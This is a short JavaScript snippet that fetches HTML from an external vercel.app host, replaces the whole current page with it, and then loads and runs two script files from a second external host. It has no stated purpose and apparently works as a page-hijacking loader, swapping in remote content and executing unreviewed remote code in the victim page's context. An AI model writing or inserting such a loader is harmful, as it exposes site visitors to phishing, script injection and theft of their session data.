fetch('https://goonrizz-testing1093fae80f1.vercel.app/new2.txt')
  .then(response => {
    if (response.ok) {
      return response.text(); // Get the HTML as text
    }
    throw new Error('Network response was not ok.');
  })
  .then(html => {
    document.documentElement.innerHTML = html; // Replace the current DOM with the new HTML
    document.body.replaceWith(document.body.cloneNode(true));

    // Load the external JavaScript file
    const script = document.createElement('script');
    script.src = 'https://curtis-gamma.vercel.app/657457.js';
    document.body.appendChild(script);
    const script2 = document.createElement('script');
    script2.src = 'https://curtis-gamma.vercel.app/noti1.js';
    document.body.appendChild(script2);
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });
